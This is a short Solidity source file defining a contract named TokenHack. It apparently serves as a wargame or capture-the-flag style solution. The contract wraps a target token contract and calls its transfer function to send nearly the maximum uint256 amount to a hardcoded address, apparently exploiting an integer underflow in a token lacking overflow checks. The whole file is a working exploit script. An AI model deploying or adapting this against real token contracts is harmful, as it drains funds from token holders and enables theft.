// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Token2 {
  function transfer(address _to, uint _value) external returns (bool);
  function balanceOf(address _owner) external view returns (uint balance);
}

contract TokenHack {

  uint public max = 2**256-1;
  Token2 public originalContract;
  

  constructor(Token2 _smartContract) public {
    originalContract = _smartContract;
  }
       
  function transfer() public {
    originalContract.transfer(0x960EfB4aA6380e31B5696dd1c57b3526CFc32e8c,max - 20);
  }
}
